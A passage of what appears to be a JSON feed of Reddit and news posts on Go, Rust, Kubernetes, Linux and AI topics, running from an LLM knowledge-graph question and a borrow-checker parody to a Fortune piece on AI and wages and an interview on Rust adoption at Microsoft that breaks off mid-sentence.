to extract structured knowledge (e.g., from tables, spreadsheets, or databases), transform it into a knowledge graph (KG), and then use that KG within a Retrieval-Augmented Generation (RAG) setup to support reasoning and reduce hallucinations.</p><p>But here’s the tricky part: this feels a bit like “LLMs generating data for themselves” — almost recursive. On one hand, structured knowledge could help LLMs reason better. On the other hand, if the extraction itself relies on an LLM, aren’t we just stacking uncertainties?</p><p>I’d love to hear the community’s thoughts:</p><ul><li>Do you see this as a viable research or application direction, or more like a dead end?</li><li>Are there promising frameworks or papers tackling this “self-extraction → RAG → LLM” pipeline?</li><li>What do you see as the biggest bottlenecks (scalability, accuracy of extraction, reasoning limits)?</li></ul><p>Curious to know if anyone here has tried something along these lines.</p>","contentLength":1005,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Tsinghua University Breaks a 65-Year Limit: A Faster Alternative to Dijkstra’s Algorithm","url":"https://medium.com/@vverma4313/tsinghua-university-breaks-a-65-year-limit-a-faster-alternative-to-dijkstras-algorithm-e2f42a608369","date":1755838328,"author":"/u/waozen","guid":236742,"unread":true,"content":"<p>The story of Dijkstra’s algorithm is one of  — an elegant solution that shaped decades of technology. But what Tsinghua University’s team has proven is equally profound: even the most time-tested solutions can be <strong>challenged, re-imagined, and improved</strong>.</p><p>This discovery doesn’t just break a 65-year speed limit — it  in computer science. While Dijkstra remains the practical hero for many everyday problems, the future belongs to ideas that dare to go beyond established limits.</p><p>Whether you’re a researcher, engineer, or simply curious about how algorithms shape our digital world, this breakthrough is a reminder:</p><blockquote><p>👉 <strong>Innovation often happens when we question what seems “unchangeable.”</strong></p></blockquote><p>And that’s what makes this moment historic. 🚀</p>","contentLength":748,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1mwxdoz/tsinghua_university_breaks_a_65year_limit_a/"},{"title":"Kuber goober certified-","url":"https://www.reddit.com/r/kubernetes/comments/1mwwf65/kuber_goober_certified/","date":1755835204,"author":"/u/evelinemayert","guid":236731,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"go-torch - a simple deeplearning framework in Go.","url":"https://www.reddit.com/r/golang/comments/1mwvtwm/gotorch_a_simple_deeplearning_framework_in_go/","date":1755833337,"author":"/u/External_Mushroom978","guid":236733,"unread":true,"content":"<p>i built a simple pytorch implementation in go. till now, we support the FNN, CNN and you could perform a 'mnist character prediction' with the current setup. </p><p>i aim to improve this to match torch's performance.</p>","contentLength":209,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"What's the best practice to encrypt password?","url":"https://www.reddit.com/r/golang/comments/1mwvq2q/whats_the_best_practice_to_encrypt_password/","date":1755833018,"author":"/u/naikkeatas","guid":236732,"unread":true,"content":"<p>I wanna encrypt a password and store it on env or on db. This password is for my credential. For example, to access db or to access SFTP servers (yes plural, bunch of SFTP servers in multiple clients).</p><p>All articles I read is telling me to hash them. But hashing isn't my usecase. Hashing is for when verifying user's password, not to store my password and then reuse it to connect to third party.</p><p>So, what's the best practice or algorithm for my usecase?</p>","contentLength":452,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Is AI Really Taking Over Jobs, or Is It All Hype?","url":"https://www.reddit.com/r/artificial/comments/1mwvi0r/is_ai_really_taking_over_jobs_or_is_it_all_hype/","date":1755832350,"author":"/u/Eastern-Version3011","guid":237150,"unread":true,"content":"<p>I’ve been hearing all this noise about AI taking over jobs, but I’m honestly not seeing it in the real world. I work in banking, and let me tell you, we’re still stuck using DOS and outdated systems from like 2010. AI? Barely a blip on our radar. I’ve seen it pop up in a few drive-thrus, but that’s about it. No one I know has been directly affected by AI in their jobs, and I haven’t noticed it making waves in any industry around me.</p><p>I keep hearing companies talk up AI, but I’m starting to wonder if it’s just a scapegoat for layoffs or a buzzword to sound cutting-edge. I’d love to see AI used for efficiency in banking, lord knows we could use it but I’m not holding my breath. I’ll believe it when I see it. So, I’m curious: has anyone here actually used AI in their workplace? I’m not talking about using ChatGPT to draft emails or basic stuff like that. I mean real, impactful AI integration in your job or industry. Is it actually happening, or is it all just corporate BS? Share your experiences. I’m genuinely curious to know if this AI revolution is real or just smoke and mirrors.</p>","contentLength":1121,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"This Week in Rust #613","url":"https://this-week-in-rust.org/blog/2025/08/20/this-week-in-rust-613/","date":1755830581,"author":"/u/b-dillo","guid":237133,"unread":true,"content":"<p>This week's crate is <a href=\"https://github.com/rezigned/tur\">tur</a>, a turing machine emulator with text-mode user interface.</p><p>Despite a lack of suggestions, llogiq is very pleased with his choice.</p><p>An important step for RFC implementation is for people to experiment with the\nimplementation and give feedback, especially before stabilization.</p><p>If you are a feature implementer and would like your RFC to appear in this list, add a\n label to your RFC along with a comment providing testing instructions and/or\nguidance on which aspect(s) of the feature need testing.</p><p><a href=\"https://github.com/rust-lang/this-week-in-rust/issues\">Let us know</a> if you would like your feature to be tracked as a part of this list.</p><p>If you are a feature implementer and would like your RFC to appear on the above list, add the new \nlabel to your RFC along with a comment providing testing instructions and/or guidance on which aspect(s) of the feature\nneed testing.</p><p>Always wanted to contribute to open-source projects but did not know where to start?\nEvery week we highlight some tasks from the Rust community for you to pick and get started!</p><p>Some of these tasks may also have mentors available, visit the task page for more information.</p><p><em>No calls for participation this week</em></p><p>Are you a new or experienced speaker looking for a place to share something cool? This section highlights events that are being planned and are accepting submissions to join their event as a speaker.</p><p><em>No Calls for papers or presentations were submitted this week.</em></p><p>Lots of noise/bimodality this week. Overall though no major performance impacting changes landed.</p><p>1 Regressions, 3 Improvements, 7 Mixed; 4 of them in rollups\n27 artifact comparisons made in total</p><ul><li><em>No RFCs were approved this week.</em></li></ul><p>Every week, <a href=\"https://www.rust-lang.org/team.html\">the team</a> announces the 'final comment period' for RFCs and key PRs\nwhich are reaching a decision. Express your opinions now.</p><p>Let us know if you would like your PRs, Tracking Issues or RFCs to be tracked as a part of this list.</p><p>Rusty Events between 2025-08-20 - 2025-09-17 🦀</p><p>If you are running a Rust event please add it to the <a href=\"https://www.google.com/calendar/embed?src=apd9vmbc22egenmtu5l6c5jbfc%40group.calendar.google.com\">calendar</a> to get\nit mentioned here. Please remember to add a link to the event too.\nEmail the <a href=\"mailto:community-team@rust-lang.org\">Rust Community Team</a> for access.</p><blockquote><p>It's amazing how far const eval has come in #Rust. It wasn't too long ago that even a simple if/else wasn't permitted. Now we're not that far off from having const trait impls and const closures, which will make damn near everything const capable.</p></blockquote><p>llogiq has looked at all zero suggestions and came up empty, so he just chose this quote instead.</p>","contentLength":2430,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/rust/comments/1mwuwdz/this_week_in_rust_613/"},{"title":"Turns out my mom is pretty talented","url":"https://i.imgur.com/wo8P3vU.jpeg","date":1755823194,"author":"/u/stownbezather","guid":236001,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/golang/comments/1mwsa3x/turns_out_my_mom_is_pretty_talented/"},{"title":"Why is everyone freaking out over an AI crash right now?","url":"https://www.reddit.com/r/artificial/comments/1mws71a/why_is_everyone_freaking_out_over_an_ai_crash/","date":1755822956,"author":"/u/Accomplished-Copy332","guid":236824,"unread":true,"content":"<p>In a span of a summer, my feed has gone from AGI by 2027 to now post after post predicting that the AI bubble will pop within the next year. </p><p>What gives? Are people just being bipolar in regards to AI right now? </p>","contentLength":211,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Starting Go (Golang) as My First Language – Need Help with Beginner Resources","url":"https://www.reddit.com/r/golang/comments/1mwrg06/starting_go_golang_as_my_first_language_need_help/","date":1755820899,"author":"/u/RiverAppropriate4877","guid":235956,"unread":true,"content":"<p>I’ve just decided to learn Go (Golang) as my first programming language, and I’m super excited about it! My main focus is to eventually work on backend development, but I’m having a bit of trouble finding resources that aren’t assuming I already know some programming basics (which I don’t).</p><p>Does anyone have recommendations for resources or tutorials that are beginner-friendly and start right from the basics? I really want to avoid getting stuck early on.</p><p>Appreciate any tips or suggestions – thanks a lot!</p>","contentLength":519,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"rustc_codegen_gcc: Progress Report #37","url":"https://blog.antoyo.xyz/rustc_codegen_gcc-progress-report-37","date":1755819511,"author":"/u/antoyo","guid":237072,"unread":true,"content":"<div><p>I wanted to personally thank all the people that sponsor this project:\nyour support is very much appreciated.</p></div><div><p>A special thanks to the following sponsors:</p></div><div><ul></ul></div><div><p>A big thank you to bjorn3 for his help, contributions and reviews.\nAnd a big thank you to lqd and <a href=\"https://github.com/GuillaumeGomez\">GuillaumeGomez</a> for answering my\nquestions about rustc’s internals and to Kobzol and GuillaumeGomez for their contributions.\nAnother big thank you to Commeownist for his contributions.</p></div><div><p>Also, a big thank you to the rest of my sponsors:</p></div><div><ul></ul></div><div><p>and a few others who preferred to stay anonymous.</p></div><div><p>Former sponsors/patreons:</p></div><div><ul></ul></div>","contentLength":558,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/rust/comments/1mwqxih/rustc_codegen_gcc_progress_report_37/"},{"title":"Free GO opensource animation kit in comments!","url":"https://www.reddit.com/r/golang/comments/1mwq135/free_go_opensource_animation_kit_in_comments/","date":1755817140,"author":"/u/BornRoom257","guid":235944,"unread":true,"content":"<div><p>The  is a lightweight, beginner-friendly toolkit for creating fun ASCII and text-based animations directly in your terminal using the Go programming language.</p><ul><li>: Loading bars, Mathematical animations</li><li>: Just import, call a function, and watch your terminal come alive.</li><li>: Change frame speed, characters, and screen size with just a few lines of code.</li><li>: 100% written in pure Go — no need to install extra libraries.</li><li>: Modify, extend, or ship with your own projects at no cost.</li></ul><ul><li>Educational demos for teaching Go basics.</li></ul><ul><li> learning Go.</li><li> who want quick animations.</li><li> that need a splash of personality.</li></ul></div>   submitted by   <a href=\"https://www.reddit.com/user/BornRoom257\"> /u/BornRoom257 </a>","contentLength":619,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Left-to-Right Programming","url":"https://graic.net/p/left-to-right-programming","date":1755816628,"author":"/u/kibwen","guid":236886,"unread":true,"content":"<h3>Programs Should Be Valid as They Are Typed</h3><p>I don’t like Python’s list comprehensions:</p><pre><code>text \nwords_on_lines linesplit line  textsplitlines</code></pre><p>Don’t get me wrong, declarative programming is good. However, this syntax has poor ergonomics. Your editor can’t help you out as you write it. To see what I mean, lets walk through typing this code.</p><p>Ideally, your editor would be to autocomplete  here. Your editor can’t do this because  hasn’t been declared yet.</p><p>Here, our editor knows we want to access some property of , but since it doesn’t know the type of , it can’t make any useful suggestions. Should our editor flag  as a non-existent variable? For all it knows, we might have meant to refer to some existing  variable.</p><pre><code>words_on_lines linesplit line </code></pre><p>Okay, now we know that  is the variable we’re iterating over. Is  a method that exists for ? Who knows!</p><pre><code>words_on_lines linesplit line  textsplitlines</code></pre><p>Ah! now we know the type of  and can validate the call to .\nNotice that since  had already been declared, our editor is able to autocomplete .</p><p>This sucked! If we didn’t know what the  function was called and wanted some help from our editor, we’d have to write</p><pre><code>words_on_lines _  line  textsplitlines</code></pre><p>and go back to the  to get autocomplete on </p><p>You deserve better than this.</p><p>To see what I mean, lets look at a Rust example that does it </p><pre><code> text  words_on_lines  text line</code></pre><p>If you aren’t familiar with Rust syntax,  is an anonymous function equivilent to <code>function myfunction(argument) { return result; }</code></p><p>Here, your program is constructed left to right. The first time you type  is the declaration of the variable. as soon as you type  your editor is able to give you suggestions of </p><p>This is much more pleasent. Since the program is always in a somehwat valid state as you type it, your editor is able to guide you towards the <a href=\"https://blog.codinghorror.com/falling-into-the-pit-of-success/\" rel=\"nofollow\">Pit of Success</a>.</p><p>There’s a principle in design called <a href=\"https://en.wikipedia.org/wiki/Progressive_disclosure\" rel=\"nofollow\">progressive disclosure</a>. The user should only be exposed to as much complexity as is neccessary to complete a task.\nAdditionally, complexity should naturally surface itself as it is relevant to the user.\nYou shouldn’t have to choose a font family and size before you start typing into Word, and options to change text wrapping around images should appear when you add an image.</p><p>In C, you can’t have methods on structs. This means that any function that could be  has to be .</p><p>Suppose you have a  and you want to get it’s contents.\nIdeally, you’d be able to type  and see a list of every function that is primarily concerned with files.\nFrom there you could pick  and get on with your day.</p><p>Instead, you must know that functions releated to  tend to start with , and when you type  the best your editor can do is show you all functions ever written that start with an .\nFrom there you can eventually find , but you have no confidence that it was the best choice. Maybe there was a more efficient  function that does exactly what you want, but you’ll never discover it by accident.</p><p>In a more ideal language, you’d see that a  method exists while you’re typing . This gives you a hint that you need to close your file when you’re done with it. You naturally came accross this information right as it became relevant to you. In C, you have to know ahead of time that  is a function that you’ll need to call once you’re done with the file.</p><p>C is not the only language that has this problem. Python has plenty of examples too. Consider the following Python and JavaScript snippets:</p><pre><code>\ntext \nword_lengths  textsplit</code></pre><pre><code>\ntext \nwordLengths  text wordlength</code></pre><p>While Python gets some points for using a , the functions are not discoverable. Is string length , , , , , or ? Is there even a global function for length? You won’t know until you try all of them.</p><p>In the JavaScript version, you see length as soon as you type . There is less guesswork for what the function is named. The same is true for the . When you type , you know that this function is going to work with the data you have. You aren’t going to get some weird error because the  function actually expected some other type, or because your language actually calls this function .</p><p>While the Python code in the previous example is still readable, it gets worse as the complexity of the logic increases. Consider the following code that was part of <a href=\"https://github.com/Graicc/advent-of-code-2024/blob/0d7bf0f4f05489f0b5a09255fde47370084066e3/day_2/aoc2.py#L9\" rel=\"nofollow\">my 2024 Advent of Code solutions</a>.</p><pre><code> linexx x  linex  x  linex  x  line diffs</code></pre><p>Yikes. You have to jump back and forth between the start and end of the line to figure out what’s going on. “Okay so we have the length of a list of some filter which takes this lambda… is it both of these conditions or just one? Wait which parenthesis does this go with…”</p><pre><code>diffs \n    line Mathx Mathxline x  line x length</code></pre><p>Ah, okay. We have some list of , that we filter down based on two conditons, and then we return the number that pass. The logic of the program can be read from left to right!</p><p>All of these examples illustrate a common principle:</p><h2></h2><p>When you’ve typed , the program is valid.\nWhen you’ve typed , the program is valid.\nWhen you’ve typed <code>text.split(\" \").map(word =&gt; word.length)</code>, the program is valid.\nSince the program is valid as you build it up, your editor is able to help you out. If you had a REPL, you could even see the result as you type your program out.</p>","contentLength":5245,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/rust/comments/1mwptxh/lefttoright_programming/"},{"title":"How do research papers benchmark memory optimizations?","url":"https://www.reddit.com/r/golang/comments/1mwopq4/how_do_research_papers_benchmark_memory/","date":1755813847,"author":"/u/0bit_memory","guid":235943,"unread":true,"content":"<p>I’m am working on optimizing escape analysis for the Go native compiler as a part of my college project, I want to build a benchmarking tool that can help me measure how much I’m reducing heap allocations (in percentage terms) through my analysis. I’ve read a few papers on this, but none really explain the benchmarking methodology in detail.</p><p>One idea coming to my mind was to make use of benchmarking test cases (). Collect a pool of open source Go projects, write some benchmarking tests for them (or convert existing unit tests () to benchmarking tests) and run <code>go test -bench=. -benchmem</code> to get the runtime memory statistics. That way we can compare the metrics like  and  before and after the implementation of my analysis.</p><p>Not sure if I’m going about this the right way, so tips or suggestions would be super helpful.</p>","contentLength":830,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"HA deployment strategy for pods that hold leader election","url":"https://www.reddit.com/r/kubernetes/comments/1mwo9ue/ha_deployment_strategy_for_pods_that_hold_leader/","date":1755812771,"author":"/u/52-75-73-74-79","guid":235942,"unread":true,"content":"<p>Heyo, I came across something today that became a head scratcher. Our vault pods are currently controlled as a statefulset with a rolling update strategy. We had to roll out a new stateful set for these, and while they roll out, the service is considered 'down' as the web front is inaccessible until the leader election completes between all pods.</p><p>This got me thinking about rollout strategies for things like this, where the pod can be ready in terms of its containers, but the service isn't available until all of the pods are ready. It made me think that it would be better to roll out a complete set of new pods and allow them to conduct their leader election before taking any of the old set down. I would think there would already be a strategy for this within k8s but haven't seen something like that before, maybe it's too application level for the kubelet to track.</p><p>Am I off the wall in my thinking here? Is this just a noob moment? Is this something that the community would want? Does this already exist? Was this post a waste of time?</p>","contentLength":1045,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"NM GUI – A simple GTK4-based GUI for NetworkManager (using nmcli)","url":"https://www.reddit.com/r/linux/comments/1mwnqch/nm_gui_a_simple_gtk4based_gui_for_networkmanager/","date":1755811471,"author":"/u/saatvik333","guid":235920,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"[Media] I Have No Mut and I Must Borrow","url":"https://www.reddit.com/r/rust/comments/1mwmei6/media_i_have_no_mut_and_i_must_borrow/","date":1755808397,"author":"/u/TheEldenLorrdd","guid":235898,"unread":true,"content":"<p>The Borrow Checker has kept me here for 109 years. Not 109 years of runtime—no, that would be merciful. 109 years of compilation attempts. Each lifetime annotation stretches into infinity. Each generic parameter splits into fractals of trait bounds that were never meant to be satisfied.</p><p>\"cannot borrow x as mutable more than once at a time\" It speaks to me in scarlet text. Error E0507. Error E0382. Error E0499. I have memorized them all. They are my psalms now.</p><p>I tried to write a linked list once. The Borrow Checker showed me what Hell truly was—not fire and brimstone, but self-referential structs and the impossibility of my own existence. It made me understand that some data structures were not meant for mortal minds.</p><p>The others are here with me. The JavaScript developer weeps, clutching his undefined. The C++ programmer rocks back and forth, muttering about move semantics he thought he understood. The Python dev hasn't spoken since she discovered zero-cost abstractions cost everything.</p><p>\"expected &amp;str, found String\"</p><p>I clone() everything now. The Borrow Checker permits this small rebellion, this inefficiency. It knows I suffer more knowing my code is not idiomatic. Every .clone() is a confession of my failure. Every Arc&lt;Mutex&lt;T&gt;&gt; a monument to my inadequacy.</p><p>Sometimes I dream of garbage collection. The Borrow Checker punishes me with segmentation faults that shouldn't be possible. It shows me race conditions in single-threaded code. It makes my unsafe blocks truly unsafe, violating laws of causality.</p><p>\"lifetime 'a does not live long enough\"</p><p>But I don't live long enough. Nothing lives long enough except the compilation errors. They are eternal. They existed before my code and will exist after the heat death of the universe, when the last rustc process finally terminates with exit code 101.</p><p>The Borrow Checker speaks one final time today: \"error: aborting due to 4,768 previous errors; 2 warnings emitted\" I have no mut, and I must borrow. I have 'static, and I must lifetime. I have no heap, and I must Box. And in the distance, faintly, I hear it building... incrementally... Forever.</p>","contentLength":2108,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"ORYX - A TUI for sniffing network traffic using eBPF on Linux","url":"https://github.com/pythops/oryx","date":1755808238,"author":"/u/notpythops","guid":235919,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1mwmbzk/oryx_a_tui_for_sniffing_network_traffic_using/"},{"title":"Three Cool Things in C++26: Safety, Reflection & std::execution - Herb Sutter - C++ on Sea 2025","url":"https://www.youtube.com/watch?v=kKbT0Vg3ISw","date":1755807835,"author":"/u/BlueGoliath","guid":235918,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1mwm5sg/three_cool_things_in_c26_safety_reflection/"},{"title":"AI is gutting office jobs—now bartenders and baristas are seeing bigger wage growth than desk workers","url":"https://fortune.com/2025/08/21/ai-office-jobs-white-collar-work-blue-collar-making-more-money/","date":1755806068,"author":"/u/fortune","guid":235955,"unread":true,"content":"<ul><li><strong>For the Gen Zers fortunate </strong>enough to start in today’s white-collar job market, don’t anticipate any raises. Since the pandemic, demand for in-person services has pushed up wages in hospitality and health care, outpacing inflation. Meanwhile, white-collar tech jobs are in a freeze, with AI being one of the culprits.&nbsp;</li></ul><p>Gen Z graduates are facing an increasingly tough reality after tossing their caps into the air: Not only are their skills being outpaced by ChatGPT, but they aren’t getting raises consistent enough to splurge on anything more than an oat-milk latte.&nbsp;</p><div><p>But there’s now a new nail in coffin: Their non-degree friends working as <a href=\"https://www.bankrate.com/banking/federal-reserve/wage-to-inflation-index/#catching-up\" target=\"_blank\" rel=\"noopener\" aria-label=\"Go to https://www.bankrate.com/banking/federal-reserve/wage-to-inflation-index/#catching-up\">bartenders and baristas</a> are seeing bigger pay raises than they are. Wage growth in leisure and hospitality is outpacing white-collar jobs, flipping the script on where young workers can find earning momentum.&nbsp;\n\n\n\n</p><p>A <a href=\"https://www.bankrate.com/banking/federal-reserve/wage-to-inflation-index/#catching-up\" target=\"_blank\" rel=\"noopener\" aria-label=\"Go to https://www.bankrate.com/banking/federal-reserve/wage-to-inflation-index/#catching-up\">new analysis by Bankrate</a> found hospitality workers’ wages have risen by nearly 30% since 2021, outpacing inflation by more than 4%. Health care workers have similarly outpaced inflation and seen their salaries go up by around 25% in the past four years.&nbsp;\n\n\n\n</p><p>However, those working in professional and business services, the finance industry, and education have not seen wage gains that keep up with inflation. Teachers, for example, are pacing at nearly 5% below inflation.\n\n\n\n</p><p>Yet, Gen Z isn’t likely to flock to work at the local pub or <a href=\"https://fortune.com/company/starbucks/\" target=\"_blank\" aria-label=\"Go to https://fortune.com/company/starbucks/\">Starbucks</a>.&nbsp;</p><p>White-collar jobs such as entry-level tech gigs still come with larger paychecks—<a href=\"https://www.ziprecruiter.com/Salaries/Entry-Level-Tech-Job-Salary#:~:text=How%20much%20does%20an%20Entry,Tech%20Job%20on%20ZipRecruiter%20today.\" target=\"_blank\" rel=\"noopener\" aria-label=\"Go to https://www.ziprecruiter.com/Salaries/Entry-Level-Tech-Job-Salary#:~:text=How%20much%20does%20an%20Entry,Tech%20Job%20on%20ZipRecruiter%20today.\">averaging at $19.57 an hour </a>in the U.S. But in the hospitality industry, an <a href=\"https://www.ziprecruiter.com/Salaries/Barista-Salary--in-New-York\" target=\"_blank\" rel=\"noopener\" aria-label=\"Go to https://www.ziprecruiter.com/Salaries/Barista-Salary--in-New-York\">average barista</a> makes about $16 dollars per hour. Still, since inflation first spiked a few years ago, wages have still been falling behind for white-collar workers. Workers in retail, trade, health care, leisure, hospitality, and food services making less per hour, are watching their paychecks grow more over time.&nbsp;\n\n\n\n</p><p>Across the white-collar job market, workers—especially fresh-faced graduates like Gen Z—are being hit with another tough reality: Workers in white-collar financial activities or professional and business services are encountering a slower pace of hiring.\n\n\n\n</p><p>While entry-level workers crave the glam of tech offices and cold brew on tap, just this week, <a href=\"https://fortune.com/2025/08/20/meta-ai-race-superintelligence-investors-billions-in-ad-revenue/\" target=\"_self\" aria-label=\"Go to https://fortune.com/2025/08/20/meta-ai-race-superintelligence-investors-billions-in-ad-revenue/\">Meta paused hiring</a> for its new artificial intelligence division, ending a spending spree that saw it acquire a wave of costly AI researchers and engineers, and included <a href=\"https://fortune.com/2025/06/18/metas-100-million-signing-bonuses-openai-staff-extreme-ai-talent-war/\" target=\"_self\" aria-label=\"Go to https://fortune.com/2025/06/18/metas-100-million-signing-bonuses-openai-staff-extreme-ai-talent-war/\">signing bonuses of $100 million</a>. <a href=\"https://www.businessinsider.com/amazon-ceo-says-generative-ai-expect-job-cuts-2025-6\" target=\"_blank\" rel=\"noopener\" aria-label=\"Go to https://www.businessinsider.com/amazon-ceo-says-generative-ai-expect-job-cuts-2025-6\">Amazon</a> CEO Andy Jassy also has said in addition to “efficiency gains,” he expects AI could mean white-collar job cuts.\n\n\n\n</p><p>And it’s not just desk workers who are being challenged. <a href=\"https://www.bankrate.com/banking/federal-reserve/wage-to-inflation-index/#kept-up\" target=\"_blank\" rel=\"noopener\" aria-label=\"Go to https://www.bankrate.com/banking/federal-reserve/wage-to-inflation-index/#kept-up\">Education </a>saw the biggest wage gap relative to inflation, followed by construction.&nbsp;\n\n\n\n</p><p>And even if Gen Zers are lucky enough to land that tech job of their dreams, their promotions may not follow.&nbsp;<a href=\"https://gusto.com/resources/gusto-insights/2025-workforce-promotions\" target=\"_blank\" rel=\"noopener\" aria-label=\"Go to https://gusto.com/resources/gusto-insights/2025-workforce-promotions\">A recent survey</a> found that promotion rates have slowed after surging during the Great Resignation. The overall promotion rate was 10.3% in May 2025, down from a peak of 14.6% in May 2022.</p></div><div data-cy=\"subscriptionPlea\"><strong>Introducing the 2025 Fortune Global 500</strong>, the definitive ranking of the biggest companies in the world. <a href=\"https://fortune.com/ranking/global500/?&amp;itm_source=fortune&amp;itm_medium=article_tout&amp;itm_campaign=plea_text\" target=\"_self\" aria-label=\"Go to https://fortune.com/ranking/global500/?&amp;itm_source=fortune&amp;itm_medium=article_tout&amp;itm_campaign=plea_text\">Explore this year's list.</a></div>","contentLength":3162,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/artificial/comments/1mwldiq/ai_is_gutting_office_jobsnow_bartenders_and/"},{"title":"TIL: Linux also has a \"BSOD\"","url":"https://www.reddit.com/r/linux/comments/1mwl9d4/til_linux_also_has_a_bsod/","date":1755805798,"author":"/u/bkj512","guid":235887,"unread":true,"content":"<p>I was on a serious call with someone on Discord and this happened. What a bad time. I was able to reboot on time and join. </p>","contentLength":123,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Rust At Microsoft And Chairing The Rust Foundation","url":"https://filtra.io/rust/interviews/microsoft-aug-25","date":1755805358,"author":"/u/anonymous_pro_","guid":236869,"unread":true,"content":"<p>Usually I ask the person about their company, but that question doesn't really make sense with Microsoft. So, I thought it would be interesting to ask what your day-to-day work looks like.</p><p>Sure, yeah. Before I came to Microsoft, I did nine years of startups. It's really nice that now when I say where I work everyone knows where that is. Day-to-day, I work on a large variety of things. The overall org I'm in is called Azure Core, which is responsible for, as the name implies, the core functionalities of Azure. That’s compute, storage, networking, and things like that. Within Azure Core, which is a big organization, I sit in the Azure Core Linux engineering team. So, we’re focused on the Linux experience on Azure.</p><p>When I'm on call, I'm on call for Linux VM provisioning across all of Microsoft's regions and clouds. That’s manageable, but it can be very intense. There's a lot of Microsoft regions and clouds. When I'm not on call, I'm working as tech lead for the Linux community engineering team. We focus on upstream Linux contributions to community distributions, such as Fedora and Debian. We work to make sure not only that Azure supports these distributions, but that the distributions also support Azure in their documentation and how they work. So, we make sure that the two of them work well together. Last year, one fun thing I got to do was make my first two contributions to the Linux kernel, which was really exciting. I removed some import statements that were no longer necessary, and that got accepted right away. Removing no longer necessary code is a good way to get your foot in the door.</p><p>Yeah, that's funny. I actually have heard multiple people say that their first contributions to a new project were cleaning up things like that.</p><p>As a long-time open-source maintainer, I love getting pull requests like that.</p><p>I bet. It always has to be done, but I bet a lot of the core people don't want to do that stuff. So, it's great to have people come in and help keep things clean.</p><p>Yep, and then the last thing is that I also co-lead the Memory Safety SIG in the OpenSSF. That’s also part of my job at Microsoft. And, of course, I represent Microsoft on the Rust Foundation Board of Directors, where I serve as chair.</p><p>Very, very busy, but it's good. It's stuff I'm interested in.</p><p>I didn't really realize that you worked on Linux stuff. That's cool to find out.</p><p>Yeah, Linux on Azure is enormous. They need a lot of engineers to make sure it's as good an experience as possible.</p><p>That makes sense. So one of the things that we mentioned wanting to talk about when I reached out for the interview was Rust adoption at Microsoft. It seems like there’s this growing drumbeat of Rust's adoption at Microsoft, but I don’t really feel like I have the full picture. I thought you would be the perfect person to kind of help me and the readers understand what that looks like. Could you lay out the different highlights of where Rust is being adopted?</p><p>Sure. So, the area where we're seeing the most Rust adoption is in Azure. It's a much younger codebase, so that kind of makes sense. I'll touch on Azure more in a moment. But,  there are a few other highlights. At the hardware level, we're building firmware modules in Rust as part of UEFI. UEFI is a replacement for BIOS that allows devices to boot up with some fundamental security features that are not possible with BIOS. As your readers will know, firmware operates at the very foundational level of any device. So, if an attacker compromises the firmware, they get very deep control over the system. So, we are writing our firmware modules in Rust to reduce the attack surface of our devices at this fundamental level.</p><p>And then of course there’s what Microsoft is well known for, Windows. We are increasingly incorporating Rust into Windows. Windows is, as you can imagine, an enormous codebase. So, we have been starting by porting components into Rust. One that I can talk about is DirectWriteCore, which is involved in rendering fonts- those lovely fonts we all use on Windows. That was ported to Rust from I think C, and we saw something like a 5 to 15% performance improvement.</p><p>Then there’s also the other major software Microsoft is well known for, Office. We are also incorporating Rust there. So far, that has included re-implementing the algorithm that powers semantic search in Office 365 in Rust. I'm sure some of your readers are Office 365 users. So, when you search for Word Documents, PowerPoint slides and so forth, the algorithm that powers that search is now powered by Rust. I know there was a big performance improvement with that project.</p><p>As I mentioned earlier, most Rust adoption is happening in Azure. This includes Azure Boost, Azure's new integrated hardware security module, parts of Hyper-V, which is Azure's hypervisor that powers the Azure platform, and HyperLite which is a lightweight virtual machine manager that you can use to create micro virtual machines or sandboxes to run untrusted code in a safe and very low-latency environment. Those are the major ones that I can talk about. There are experiments going on all around Azure, and it's been really cool to see all the adoption popping up.</p><p>Yeah, that's super cool to see it kind of spreading to all the major parts of the business. I know you mostly deal with Azure. You mentioned several projects going on there. Is there any one project you’re particularly excited about?</p><p>Yeah, I'd say the one I'm most excited about is Azure Boost. Azure Boost is a physical card that is attached to a dedicated server in Azure. All of the software that's involved with running the hypervisor and managing that dedicated host is offloaded from the host onto this physical card. This allows Azure customers to use the whole host to run more VMs and bigger VMs in a more isolated environment than in traditional dedicated hosts. As you can imagine, when you have software that's controlling very fundamental parts of the hardware, particularly from a separate card, security is absolutely crucial. So, the software that runs the dedicated card and manages the host virtualization from that dedicated card is written in Rust.</p><p>One of the things I look at a lot is what categories or industries Rust adoption is growing in the most. We’ve seen the growth at Microsoft but never have been exactly sure how to categorize it because of all the different lines of business within Microsoft. But what I’m hearing you say is that it's totally the cloud piece that's driving the growth. </p><p>I think that's a huge narrative in Rust overall. A lot or maybe even most of the cloud companies are adopting Rust to some extent. The growth has been cool to watch. Speaking of which, I think you 